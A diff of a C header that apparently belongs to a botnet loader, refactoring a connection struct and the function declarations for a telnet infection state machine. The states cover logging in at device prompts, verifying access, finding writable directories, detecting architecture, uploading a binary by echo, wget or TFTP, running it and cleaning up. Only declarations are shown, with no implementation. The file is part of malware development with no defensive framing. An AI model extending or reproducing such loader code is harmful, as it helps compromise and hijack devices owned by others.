@@ -1,67 +1,74 @@
 #pragma once
 
-#include <time.h>
-#include <pthread.h>
 #include "includes.h"
 #include "telnet_info.h"
 
-struct connection {
-    pthread_mutex_t lock;
-    struct server *srv;
-    struct binary *bin;
-    struct telnet_info info;
-    int fd, echo_load_pos;
-    time_t last_recv;
-    enum {
-        TELNET_CLOSED,          // 0
-        TELNET_CONNECTING,      // 1
-        TELNET_READ_IACS,       // 2
-        TELNET_USER_PROMPT,     // 3
-        TELNET_PASS_PROMPT,     // 4
-        TELNET_WAITPASS_PROMPT, // 5
-        TELNET_CHECK_LOGIN,     // 6
-        TELNET_VERIFY_LOGIN,    // 7
-        TELNET_PARSE_PS,        // 8
-        TELNET_PARSE_MOUNTS,    // 9
-        TELNET_READ_WRITEABLE,  // 10
-        TELNET_COPY_ECHO,       // 11
-        TELNET_DETECT_ARCH,     // 12
-        TELNET_ARM_SUBTYPE,     // 13
-        TELNET_UPLOAD_METHODS,  // 14
-        TELNET_UPLOAD_ECHO,     // 15
-        TELNET_UPLOAD_WGET,     // 16
-        TELNET_UPLOAD_TFTP,     // 17
-        TELNET_RUN_BINARY,      // 18
-        TELNET_CLEANUP          // 19
-    } state_telnet;
-    struct {
-        char data[512];
-        int deadline;
-    } output_buffer;
-    uint16_t rdbuf_pos, timeout;
-    BOOL open, success, retry_bin, ctrlc_retry;
-    uint8_t rdbuf[8192];
+#define TELNET_CONNECTING 0
+#define TELNET_READ_IACS 1
+#define TELNET_USER_PROMPT 2
+#define TELNET_PASS_PROMPT 3
+#define TELNET_WAITPASS_PROMPT 4
+#define TELNET_CHECK_LOGIN 5
+#define TELNET_VERIFY_LOGIN 6
+#define TELNET_PARSE_PS 7
+#define TELNET_PARSE_MOUNTS 8
+#define TELNET_READ_WRITEABLE 9
+#define TELNET_COPY_ECHO 10
+#define TELNET_DETECT_ARCH 11
+#define TELNET_ARM_SUBTYPE 12
+#define TELNET_UPLOAD_METHODS 13
+#define TELNET_UPLOAD_ECHO 14
+#define TELNET_UPLOAD_WGET 15
+#define TELNET_UPLOAD_TFTP 16
+#define TELNET_RUN_BINARY 17
+#define TELNET_CLEANUP 18
+#define TELNET_CLOSED 99
+
+#define UPLOAD_ECHO 0
+#define UPLOAD_WGET 1
+#define UPLOAD_TFTP 2
+
+struct output_buffer {
+    char data[128];
+    time_t deadline;
 };
 
-void connection_open(struct connection *conn);
-void connection_close(struct connection *conn);
+struct connection {
+    int fd;
+    struct server *srv;
+    struct telnet_info info;
+    int state_telnet;
+    int timeout;
+    time_t last_recv;
+    BOOL open;
+    BOOL success;
+    BOOL retry_bin;
+    BOOL ctrlc_retry;
+    struct binary *bin;
+    char rdbuf[8192];
+    int rdbuf_pos;
+    int echo_load_pos;
+    struct output_buffer output_buffer;
+    pthread_mutex_t lock;
+};
 
-int connection_consume_iacs(struct connection *conn);
-int connection_consume_login_prompt(struct connection *conn);
-int connection_consume_password_prompt(struct connection *conn);
-int connection_consume_prompt(struct connection *conn);
-int connection_consume_verify_login(struct connection *conn);
-int connection_consume_psoutput(struct connection *conn);
-int connection_consume_mounts(struct connection *conn);
-int connection_consume_written_dirs(struct connection *conn);
-int connection_consume_copy_op(struct connection *conn);
-int connection_consume_arch(struct connection *conn);
-int connection_consume_arm_subtype(struct connection *conn);
-int connection_consume_upload_methods(struct connection *conn);
-int connection_upload_echo(struct connection *conn);
-int connection_upload_wget(struct connection *conn);
-int connection_upload_tftp(struct connection *conn);
-int connection_verify_payload(struct connection *conn);
-int connection_consume_cleanup(struct connection *conn);
-
-static BOOL can_consume(struct connection *conn, uint8_t *ptr, int amount);
+void connection_open(struct connection *);
+void connection_close(struct connection *);
+int connection_consume_iacs(struct connection *);
+int connection_consume_login_prompt(struct connection *);
+int connection_consume_password_prompt(struct connection *);
+int connection_consume_prompt(struct connection *);
+int connection_consume_verify_login(struct connection *);
+int connection_consume_psoutput(struct connection *);
+int connection_consume_mounts(struct connection *);
+int connection_consume_written_dirs(struct connection *);
+int connection_consume_copy_op(struct connection *);
+int connection_consume_arch(struct connection *);
+int connection_consume_arm_subtype(struct connection *);
+int connection_consume_upload_methods(struct connection *);
+int connection_upload_echo(struct connection *);
+int connection_upload_wget(struct connection *);
+int connection_upload_tftp(struct connection *);
+int connection_verify_payload(struct connection *);
+int connection_consume_cleanup(struct connection *);
+static BOOL can_consume(struct connection *, uint8_t *, int);
